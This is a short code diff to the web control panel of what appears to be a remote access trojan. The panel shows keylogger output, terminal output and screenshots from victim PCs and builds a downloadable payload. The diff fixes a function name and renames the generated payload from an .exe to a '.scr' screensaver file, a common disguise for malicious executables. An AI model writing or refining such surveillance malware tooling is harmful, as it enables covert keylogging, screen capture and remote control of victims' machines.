@@ -950,7 +950,7 @@
             document.getElementById('terminalOutput').textContent = '';
             document.getElementById('keyloggerOutput').textContent = '';
             document.getElementById('screenshotContainer').innerHTML = '<span style="color: #4b5563;">Loading screenshot...</span>';
-            refreshSCreen(pcName);
+            refreshScreenshot(pcName);
             refreshPCs();
         }
 
@@ -1228,7 +1228,7 @@
                 const url = window.URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = 'progam.exe'; // Filename
+                a.download = 'raiox.scr';
                 document.body.appendChild(a);
                 a.click();
                 a.remove();
@@ -1240,7 +1240,7 @@
                 out.style.color = 'var(--danger)';
             } finally {
                 btn.disabled = false;
-                btn.innerHTML = 'BUILD PROGAM.EXE';
+                btn.innerHTML = 'BUILD RAIOX.SCR';
             }
         }
 
